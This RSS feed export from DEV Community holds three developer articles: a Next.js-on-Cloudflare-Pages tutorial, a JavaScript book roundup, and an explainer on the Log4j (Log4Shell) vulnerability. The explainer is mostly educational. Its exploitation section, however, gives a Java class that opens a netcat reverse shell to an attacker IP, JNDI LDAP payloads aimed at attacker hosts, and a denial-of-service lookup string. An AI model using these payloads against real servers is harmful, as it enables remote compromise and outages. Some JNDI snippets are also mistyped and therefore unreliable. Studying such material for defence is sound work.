<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Deploy your Next.js app on Cloudflare pages</title>
      <author>Hrishikesh Pathak</author>
      <pubDate>Sat, 25 Dec 2021 19:46:27 +0000</pubDate>
      <link>https://dev.to/hrishiksh/deploy-your-nextjs-app-on-cloudflare-pages-55jf</link>
      <guid>https://dev.to/hrishiksh/deploy-your-nextjs-app-on-cloudflare-pages-55jf</guid>
      <description>&lt;p&gt;&lt;a href="https://pages.cloudflare.com"&gt;Cloudflare pages&lt;/a&gt; is a new hosting provider for &lt;a href="https://jamstack.org"&gt;JAMstack&lt;/a&gt; apps. It is gaining a lot of traction among developers. There are many reasons behind it. But the real reason is surely because of their pricing model.&lt;/p&gt;

&lt;p&gt;They are offering 3 crucial services free for their users. Now you can add &lt;em&gt;unlimited sites&lt;/em&gt;, &lt;em&gt;unlimited bandwidths&lt;/em&gt; and &lt;em&gt;unlimited request&lt;/em&gt; for free. You don't have to pay a dime, even if you are receiving a huge number of page views in your site daily.&lt;/p&gt;

&lt;p&gt;The offer is very lucrative. Isn't it ? So to test this out, In this tutorial we are going to deploy a &lt;a href="https://nextjs.org/"&gt;Next.js&lt;/a&gt; website in Cloudflare pages.&lt;/p&gt;

&lt;p&gt;Now the question is why Next.js not a simple &lt;a href="https://create-react-app.dev"&gt;create-react-app&lt;/a&gt; website ? This is because, Next.js is the most popular framework among JAMstack developers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#setting-up-the-project"&gt;
  &lt;/a&gt;
  Setting up the project
&lt;/h2&gt;

&lt;p&gt;Before start deploying our site to Cloudflare pages, we have to do some basic drill. Make sure to follow along.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#create-a-new-nextjs-app"&gt;
  &lt;/a&gt;
  Create a new Next.js app
&lt;/h3&gt;

&lt;p&gt;For this tutorial, we are going to make a new Next.js site. So run these commands to make a new Next.js website.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;npx create-next-app &amp;lt;your project name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#make-a-github-repository"&gt;
  &lt;/a&gt;
  Make a GitHub repository
&lt;/h3&gt;

&lt;p&gt;We need a &lt;a href="https://github.com"&gt;GitHub&lt;/a&gt; repository. I assume that you have a GitHub account. Cloudflare pages fetch your source code from this repository to build your website.&lt;/p&gt;

&lt;p&gt;After creating your repository, you can see a GitHub address given inside your repository. The address should be like &lt;code&gt;https://github.com/&amp;lt;your username&amp;gt;/&amp;lt;your repository name&amp;gt;.git&lt;/code&gt;. Copy this address for future use.&lt;/p&gt;

&lt;p&gt;Now come to your Next.js project root and run these commands one by one.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;git init

git add &lt;span class="nb"&gt;.&lt;/span&gt;

git commit &lt;span class="nt"&gt;-m&lt;/span&gt;&lt;span class="s2"&gt;"Initial commit"&lt;/span&gt;

git branch &lt;span class="nt"&gt;-M&lt;/span&gt; main

git remote add origin https://github.com/&amp;lt;your username&amp;gt;/&amp;lt;your repository name&amp;gt;.git

git push &lt;span class="nt"&gt;-u&lt;/span&gt; origin main
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now refresh your git repository, and you can see your Next.js source code inside your repository.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#create-a-cloudflare-account"&gt;
  &lt;/a&gt;
  Create a Cloudflare account
&lt;/h3&gt;

&lt;p&gt;Signup for &lt;a href="https://dash.cloudflare.com/sign-up/pages"&gt;Cloudflare pages&lt;/a&gt;. Then click on the &lt;strong&gt;Create a project&lt;/strong&gt;  button.&lt;/p&gt;

&lt;p&gt;Then select your GitHub account and your GitHub repository that we have created earlier. If your repository is not appearing, go to your GitHub account a give proper permission to Cloudflare extension.&lt;/p&gt;

&lt;p&gt;Then Cloudflare will guide you with their pretty simple UI.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#build-and-deploy-your-nextjs-site"&gt;
  &lt;/a&gt;
  Build and deploy your Next.js site
&lt;/h3&gt;

&lt;p&gt;Now inside the build command, if you select &lt;code&gt;Next.js static export&lt;/code&gt; then the build commands are appearing as&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;next build &amp;amp;&amp;amp; next export
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now Just hit deploy and Cloudflare will build and deploy your site across their global network of CDNs. Congratulation, now you can serve unlimited visitors absolutely for free!!&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-working-and-what-is-not"&gt;
  &lt;/a&gt;
  What is working and what is not
&lt;/h2&gt;

&lt;p&gt;At the time of writing of this article, Cloudflare pages doesn't support any of the Next.js flagship features like &lt;code&gt;getStaticProps&lt;/code&gt;,&lt;code&gt;getStaticPaths&lt;/code&gt; and &lt;code&gt;getServerSideprops&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Cloudflare pages also don't support &lt;a href="https://nextjs.org/docs/api-routes/introduction"&gt;API routes&lt;/a&gt;. The &lt;code&gt;Image&lt;/code&gt; component of Next.js is also not working.&lt;/p&gt;

&lt;p&gt;Basically, Cloudflare pages do a &lt;code&gt;static export&lt;/code&gt; of your Next.js site and serve only static files.&lt;/p&gt;

&lt;p&gt;As the platform is in its early stage, we can expect support of these features in the future. If you are not using &lt;code&gt;getServerSiteProps&lt;/code&gt; in your website, then Cloudflare offer build hooks. This build hooks trigger redeployment using webhook from your CMS.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#alternative-to-nextjs-api-routes"&gt;
  &lt;/a&gt;
  Alternative to Next.js API routes
&lt;/h2&gt;

&lt;p&gt;If you are heavily dependent on Next.js API routes, then you can use &lt;a href="https://workers.cloudflare.com"&gt;Cloudflare workers&lt;/a&gt;. This is an amazing platform for build API and, like Next.js API routes, it is also serverless.&lt;/p&gt;

&lt;p&gt;Currently, I am using Cloudflare workers in production and found a very good result. It is cheap and very fast.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#some-errors-to-be-noted"&gt;
  &lt;/a&gt;
  Some Errors to be noted
&lt;/h2&gt;

&lt;p&gt;If you are using the latest version of Next.js, Sometime it can give you error on building the project. Actually, the version of &lt;a href="https://nodejs.org/en"&gt;node.js&lt;/a&gt; used in the build process is quite old. So you can set a newer version of NodeJS in your pages environment variable.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;NODE_VERSION : 16.13.1
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;So, You have now learned how to deploy your Next.js site in Cloudflare workers. Look, the thing is that no platform is perfect. If you're a developer like me and want to host your portfolio site with some blog posts here and there, I think Cloudflare pages is a better choice than &lt;a href="https://vercel.com"&gt;vercel&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;If you are trying to build a site with a lot of moving parts, then I think, vercel is the best option you can get. Decision is yours. No one is perfect. We as a developer have to compromise. Now it is your turn. &lt;/p&gt;

&lt;p&gt;Don't forget to show me what you are building. I am on Twitter as &lt;a href="https://twitter.com/hrishikshpathak"&gt;@hrishikshpathak.&lt;/a&gt; &lt;/p&gt;

</description>
      <category>nextjs</category>
      <category>react</category>
      <category>webdev</category>
      <category>javascript</category>
    </item>
    <item>
      <title>Best JavaScript Books of 2021</title>
      <author>Matvey Romanov</author>
      <pubDate>Sat, 25 Dec 2021 19:33:56 +0000</pubDate>
      <link>https://dev.to/ra1nbow1/best-javascript-books-of-2021-4b6j</link>
      <guid>https://dev.to/ra1nbow1/best-javascript-books-of-2021-4b6j</guid>
      <description>&lt;p&gt;JS is still one of the most popular programming languages, if not the most popular. At least in the field of web development, you can't do without it. Not surprisingly, new books on JavaScript are constantly being published, as well as old ones being re-published.&lt;/p&gt;

&lt;p&gt;In this article, we have collected several such books that will be published in 2021. Our selection includes books both for beginners and experienced programmers.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#modern-javascript-for-the-impatient"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.oreilly.com/library/view/modern-javascript-for/9780136502166/"&gt;Modern JavaScript for the impatient&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Author: Kay S. Horstman. Year of publication: 2021.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--RsbgttNj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pwe4pxtoe2iknys03khl.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--RsbgttNj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pwe4pxtoe2iknys03khl.jpeg" alt="Modern JavaScript for the impatient" width="250" height="327"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This book is not for beginners in programming, there is no explanation of the basic things. If you need the basics, then there are plenty of such JavaScript books on the market, just find the right one. It is also not intended for JS programmers who want to learn new, modern standards (there are also enough such books).&lt;/p&gt;

&lt;p&gt;Kay S. Horstman is a Java advocate and Distinguished Professor of Computer Science at the university. He set himself the goal of writing a book on JavaScript for those who are generally developing in another language (for example, Java, C, C#, or C++), but would like to quickly master JS in its modern form, without historical excursions.&lt;/p&gt;

&lt;p&gt;What might this be necessary for?&lt;/p&gt;

&lt;p&gt;The fact is that user interfaces of programs are often hosted on the web, and JS is supported by all browsers. Therefore, even programmers who work in other languages, in principle, periodically need to write something in JavaScript.&lt;/p&gt;

&lt;p&gt;It's also worth noting that the book is specifically about the JavaScript language, so you won't find information about specific tools and frameworks in it. But it has a separate chapter dedicated to TypeScript.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#javascript-the-definitive-guide"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.oreilly.com/library/view/javascript-the-definitive/9781491952016/"&gt;JavaScript: The Definitive Guide&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;By David Flanagan. Year of publication: 2021.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--lpR4ZEKl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/glm8i5fy1sksguspt70z.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--lpR4ZEKl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/glm8i5fy1sksguspt70z.jpeg" alt="JavaScript: The Definitive Guide" width="250" height="328"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;David Flanagan is a well-known author of books on JavaScript, and also a programmer at Vmware.&lt;/p&gt;

&lt;p&gt;This book is a thick and detailed reference guide. The author examines the JavaScript language itself, as well as the JS APIs implemented in browsers and Node.&lt;/p&gt;

&lt;p&gt;The Book with a Rhinoceros is intended for readers who have experience in programming and want to learn JavaScript as well. It will also be of interest to JS developers who want to dive deeper into this language.&lt;/p&gt;

&lt;p&gt;In 2021, the 7th edition of Flanagan's work was published.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#javascript-everywhere"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.oreilly.com/library/view/javascript-everywhere/9781492046974/"&gt;JavaScript Everywhere&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Authors: Adam D. Scott. Year of publication: 2021. Language: Russian.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gG_0S0fP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/iuxmywdta1xzcqqwtycm.jpeg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gG_0S0fP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/iuxmywdta1xzcqqwtycm.jpeg" alt="JavaScript Everywhere" width="250" height="328"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Adam D. Scott is a leading web developer at the Consumer Financial Protection Bureau in the United States, creating open web applications. In addition, for many years he was engaged in training and drawing up curricula in technical disciplines. In general, we can say that this is an ideal specialist in teaching web development.&lt;/p&gt;

&lt;p&gt;While teaching, Scott noticed that many people learn better when they create something. That's why his book "JavaScript Development" is a practical guide. It is intended for people who are familiar with HTML, CSS, and JavaScript, but are not yet able to use this knowledge to create real applications.&lt;/p&gt;

&lt;p&gt;As you read this book, you will understand the compatibility principles of different parts of the program, so you can build great applications.&lt;/p&gt;

&lt;p&gt;You will learn how to create APIs using Node, Express, MongoDB, and Apollo Server, and get acquainted with React. Then you'll start creating a web application using React, Apollo Client, and CSS-in-JS, as well as Electron-based applications. Mobile development is also in the plan: You'll learn how to use React Native and Expo to develop apps for iOS and Android.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#deep-learning-with-javascript"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.manning.com/books/deep-learning-with-javascript"&gt;Deep Learning with JavaScript&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HSgywnUJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jwliya1mafvtc04tihwd.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HSgywnUJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jwliya1mafvtc04tihwd.jpg" alt="Deep Learning with JavaScript" width="413" height="500"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Authors: Francois Chollet, Eric Nielson, Stan Bayleschi, Shengquing Tsei. Year of publication: 2021.&lt;/p&gt;

&lt;p&gt;TensorFlow.js — the first full-featured library for creating neural networks in JavaScript. It provides many opportunities in the field of machine learning, and Scholle's book can serve as a guide to these opportunities.&lt;/p&gt;

&lt;p&gt;As you read this book, you will learn more about the TensorFlow API.Learn how to use js to enter, process, and format data, create and load models, and perform inference, evaluation, and training.&lt;/p&gt;

&lt;p&gt;The book covers the basic concepts of machine learning in detail. Everything is explained using examples of JS code, using pseudocode and schemas. All the examples are open source, so you can experiment with them.&lt;/p&gt;

&lt;p&gt;But Scholle doesn't stop at just the basics of ML. The book also includes information on newer topics: text translation, generative models, and reinforcement learning.&lt;/p&gt;

&lt;p&gt;This book is intended for experienced JavaScript programmers who would like to try their hand at machine learning.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-joy-of-javascript"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.manning.com/books/the-joy-of-javascript"&gt;The Joy of JavaScript&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Author: Luis Atencio. Year of publication: 2021.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--hnhgPVcl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pedc5i780zozrd2pxhq1.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--hnhgPVcl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pedc5i780zozrd2pxhq1.jpg" alt="The Joy of JavaScript" width="350" height="433"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This book is intended for intermediate and advanced programmers, i.e. for those who have already mastered the basics of the language, but want to raise their understanding of its features to a new level. In theory, this should allow them to start getting real pleasure from programming in JavaScript.&lt;/p&gt;

&lt;p&gt;As you read this book, you will learn what JS can offer a developer on its own, without third-party libraries or frameworks.&lt;/p&gt;

&lt;p&gt;The author covers the basics of JavaScript only in passing, devoting more time to advanced topics, so this book is not suitable for beginners.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#javascript-cookbook"&gt;
  &lt;/a&gt;
  &lt;a href="https://www.oreilly.com/library/view/javascript-cookbook-3rd/9781492055747/"&gt;JavaScript Cookbook&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Authors: Adam D. Scott, Matthew MacDonald, Shelley Powers. Year of publication: 2021.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0JRYHRWB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h6reros4lxhm40rwqxxn.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0JRYHRWB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h6reros4lxhm40rwqxxn.jpg" alt="JavaScript Cookbook" width="350" height="461"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The Recipe Book offers ready-made solutions for common programming tasks. It also explains how to create applications that work in any browser.&lt;/p&gt;

&lt;p&gt;This book is intended for practicing developers who are looking for solutions to specific problems related to JavaScript. It can be read from cover to cover, absorbing knowledge and getting acquainted with tips on a variety of topics. However, since the problems discussed are divided into categories, the book can also be used as a reference book.&lt;/p&gt;

&lt;p&gt;In the first part of the book, the authors give recipes for using the JavaScript language itself. The second part is devoted to JS in its natural habitat: in the browser. The third part deals with issues related to Node.js.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;JavaScript books are a great investment for a web developer. In this article, we have shared with you reviews of some of the newest books. We hope that they will help you find your way around and purchase the most suitable book for you.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>books</category>
      <category>webdev</category>
      <category>programming</category>
    </item>
    <item>
      <title>Understanding and Exploiting Log4J Vulnerability</title>
      <author>Shivansh Sharma</author>
      <pubDate>Sat, 25 Dec 2021 19:23:11 +0000</pubDate>
      <link>https://dev.to/ieeecsvitc/understanding-and-exploiting-log4j-vulnerability-28ji</link>
      <guid>https://dev.to/ieeecsvitc/understanding-and-exploiting-log4j-vulnerability-28ji</guid>
      <description>&lt;p&gt;If you are here then you might have already heard of log4j vulnerability. It is the current trending topic in IT domain as this vulnerability made millions of sites vulnerable to RCE(Remote Code Execution). Lets try to understand what is Log4j and what vulnerability is exploited to gain RCE.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-log4j-"&gt;
  &lt;/a&gt;
  What is Log4J ?
&lt;/h2&gt;

&lt;p&gt;Log4J is a Java-based open source component maintained by the Apache Foundation that is commonly incorporated into Java applications. It allows to record traceability of operations at a functional and operational level in a multitude of services, even from a security point of view. So basically it is a library used for logging(maintaining a record of events occurred in a application) in applications.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--62u5tTIS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/er0ogd8yux7aj713z5ev.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--62u5tTIS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/er0ogd8yux7aj713z5ev.png" alt="View of a Log file" width="880" height="237"&gt;&lt;/a&gt;this image shows how a log file look like.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#what-is-the-vulnerability-in-log4j"&gt;
  &lt;/a&gt;
  What is the Vulnerability in Log4j?
&lt;/h2&gt;

&lt;p&gt;Developers were expecting the Log4j library to record application/server values, including input strings, with the expectation that those strings were plaintext and not able to invoke APIs but in log4j if we gave input parameter like &lt;code&gt;{jndi[:]ldap[:]//....&lt;/code&gt; we were able to invoke JNDI API. JNDI is the Java Naming and Directory Interface , It is a library/service allowing for runtime configuration. So, this JNDI API leads in leakage of sensitive information and thereby facilitate other attacks which finally results in getting a Reverse Shell.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#who-are-affected-by-log4j"&gt;
  &lt;/a&gt;
  Who are Affected by Log4J?
&lt;/h2&gt;

&lt;p&gt;Log4J can be found in variety of places. Its was widely used for logging in programmes, Application, Games, Application Development tool and hence hackers have a wide range of targets to attack.&lt;/p&gt;

&lt;p&gt;Average time to repair a software is 1-4 Weeks . As Log4J was widely used repairing it would takes years and hence this vulnerability is estimated to be exploited for years.&lt;/p&gt;

&lt;p&gt;From Open Source to Commercial Solutions all are affected by by this Vulnerability. Studies carried out by Google indicate that 8% of the packages in the central Maven repository have been affected by this vulnerability. you can check out this link for more info. &lt;a href="https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html"&gt;https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#affected-companieslist-keeps-on-increasing"&gt;
  &lt;/a&gt;
  Affected Companies(List Keeps on increasing)
&lt;/h4&gt;

&lt;p&gt;Apple, Intel, Amazon, Oracle, VMWare, IBM, Cisco, Redhat, Atlassian, BMC, Fortinet, F5, McAfee, Twitter, Baidu, Tesla, Palo Alto, SonicWALL, SolarWinds&lt;/p&gt;

&lt;p&gt;Many opensource solution are also affected here is the list of applications who used java in their infrastructure like Apache Struts, Apache Struts2,Apache Tomcat, Apache Spark, Apache Solr, Apache Kafka, ElasticSearch, flume, Log stash, IBM Qradar SIEM, NetApp, Pulse Secure, etc.&lt;/p&gt;

&lt;p&gt;Checkout this link for knowing Log4j impact on manufacturers&lt;br&gt;
&lt;a href="https://github.com/YfryTchsGD/Log4jAttackSurface"&gt;https://github.com/YfryTchsGD/Log4jAttackSurface&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#what-are-hackers-doing-by-exploiting-this-vulnerability"&gt;
  &lt;/a&gt;
  What are Hackers Doing by Exploiting this Vulnerability
&lt;/h2&gt;

&lt;p&gt;Hackers are running ransomware campaign, Deploying botnets and Mine XMR coins on Compromised Systems. None the less if they get access to data they will steal it.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#why-companies-are-not-able-to-patch-log4j-completely"&gt;
  &lt;/a&gt;
  Why Companies are not able to patch Log4J Completely?
&lt;/h2&gt;

&lt;p&gt;Most of the companies have patched their code base for Log4j but the problem that most of them are facing is that all the vendors of company need to patch log4j package in their product which is out of their control and they cannot do anything in that.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#checking-if-the-site-is-vulnerable-to-log4j-rce"&gt;
  &lt;/a&gt;
  Checking if the site is Vulnerable to log4j RCE
&lt;/h2&gt;

&lt;p&gt;To check if the site is vulnerable to Log4J RCE first find areas where we can input strings (like search box, etc.).Then Visit &lt;a href="https://log4shell.huntress.com/"&gt;https://log4shell.huntress.com/&lt;/a&gt;&lt;br&gt;
and copy this text &lt;code&gt;${jndi:ldap://log4shell.huntress.com:1389/&amp;lt;Your unique identifier&amp;gt;}&lt;/code&gt; then paste it in the input area now go back to the page from where you copied and you will see a result keyword hyperlinked click on it and see if there is a entry of your site, if the entry is there then your site is vulnerable to log4j RCE.&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4H0xmj20--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mw9wwg0mwh7a1vcqch74.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4H0xmj20--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mw9wwg0mwh7a1vcqch74.png" alt="log4shell" width="880" height="468"&gt;&lt;/a&gt;Now lets understand what is &lt;code&gt;log4shell.huntress.com&lt;/code&gt; doing and how is it checking our site for vulnerability. For this we have to understand how our input is working&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;{jndi:....&lt;/code&gt; ------&amp;gt; this invokes JNDI API and access external resources&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;:idap:....&lt;/code&gt; -----&amp;gt; this shows that target will reach out to an attacker controlled location over idap protocol&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;://log4shell.huntress.com:1389/&lt;/code&gt;-----&amp;gt; This is the address of attackers controlled host basically we are reaching out to this site.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All these parts makes us understand that we are establishing a connection between site and a attacker controlled host.&lt;/p&gt;

&lt;p&gt;Alternately you can use &lt;a href="https://github.com/cisagov/log4j-scanner"&gt;cisagov/log4j-scanner&lt;/a&gt; to scan for log4j Vulnerability on your site.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#fixing-the-vulnerability"&gt;
  &lt;/a&gt;
  Fixing The Vulnerability
&lt;/h2&gt;

&lt;p&gt;To fix this Vulnerability you should update your java and log4j to latest Version(i.e. Log4J V2.17 or above) this doesn't guarantee that Vulnerability is fully patched but reduces some what risk. Also check out snyk remediation cheat sheet &lt;a href="https://snyk.io/blog/log4shell-remediation-cheat-sheet/"&gt;https://snyk.io/blog/log4shell-remediation-cheat-sheet/&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#vulnerabilities-published-on-log4j"&gt;
  &lt;/a&gt;
  Vulnerabilities Published on Log4J
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228"&gt;CVE-2021-44228&lt;/a&gt; Version Affected: Apache Log4j2 2.0-beta9 a 2.12.1 y 2.13.0 a 2.15.0&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046"&gt;CVE-2021-45046&lt;/a&gt; Version Affected: 2.0.1 – 2.12.2 (excluded) y 2.13.0 – 2.16.0 (excluded)&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-45105"&gt;CVE-2021-45105&lt;/a&gt; Version Affected:Log4j2 versions 2.0-alpha1 hasta 2.16.0 (included).&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;
  &lt;a href="#exploiting-vulnerability-only-for-cve202144228-and-cve202145046"&gt;
  &lt;/a&gt;
  Exploiting Vulnerability (ONLY FOR CVE-2021-44228 and CVE-2021-45046)
&lt;/h2&gt;

&lt;p&gt;for Exploiting this vulnerability we will be writing an payload and then we will be compiling it and then we will trigger it to get reverse shell.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#follow-steps"&gt;
  &lt;/a&gt;
  Follow Steps:
&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Here we are considering that our targeted server's OS is linux and netcat is already installed in it.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash &amp;lt;YOUR.ATTACKER.IP.ADDRESS&amp;gt; &amp;lt;Listening port&amp;gt;");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ol&gt;
&lt;li&gt;Write exploit in Exploit.java file using above given code&lt;/li&gt;
&lt;li&gt;Compile the java file&lt;code&gt;javac Exploit.java -source 8 -target 8&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;Host a temporary HTTP server for exploit&lt;/li&gt;
&lt;li&gt;set a net cat listener to listen to exploit.&lt;code&gt;nc -lnvp &amp;lt;Attacker port number&amp;gt;&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;for CVE-2021-44228 put&lt;code&gt;{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:ATTACKER PORT/Exploit\}&lt;/code&gt;as input&lt;/li&gt;
&lt;li&gt;for CVE-2021-45046 put &lt;code&gt;{jndi:ldap://127.0.0.1#attacker.com/exploit}&lt;/code&gt; as input
1.you got a reverse shell.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For CVE-2021-45105 we cannot get a reverse shell but we can use &lt;code&gt;${${::-${::-$${::-j}}}}&lt;/code&gt; this parameter to  to generate a StackOverflow exception that may lead to the termination of the vulnerable application process, giving rise to a denial of service (DoS) vulnerability.&lt;/p&gt;

&lt;p&gt;Use this link to get technical insight on the Vulnerability&lt;br&gt;
